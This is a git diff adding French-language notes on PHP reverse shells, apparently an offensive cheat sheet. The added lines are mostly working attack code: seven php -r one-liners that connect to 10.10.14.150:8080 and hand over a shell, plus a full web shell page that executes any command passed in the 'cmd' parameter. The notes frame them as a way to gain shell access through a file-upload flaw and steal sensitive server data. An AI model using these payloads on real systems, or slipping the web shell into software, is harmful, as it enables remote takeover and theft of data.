@@ -1,2 +1,33 @@
-Reverse shell php 
+#### Elle peut s'utiliser dans le cas des vulnérabilité coté serveur donnant acces d'upload de fichier par l'attaquant et
+ainsi l'attaquant peut facilement avoir acces shell sur le serveur afin de voiler les infos sensibles sur le serveur 
+##Reverse shell php coté attaquant après injevtion coté serveur 
+
 php -r '$sock=fsockopen("10.10.14.150",8080);passthru("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.14.150",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.14.150",8080);shell_exec("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.14.150",8080);passthru("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.14.150",8080);`sh <&3 >&3 2>&3`;'
+php -r '$sock=fsockopen("10.10.14.150",8080);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+php -r '$sock=fsockopen("10.10.14.150",8080);system("sh <&3 >&3 2>&3");'
+
+## Reverse coté serveur en php 
+##Cette reverse  te permettra d'obtenir un shell avec un champ de saisi directement sur le serveur pour afin executer celui 
+coté attaquant
+
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
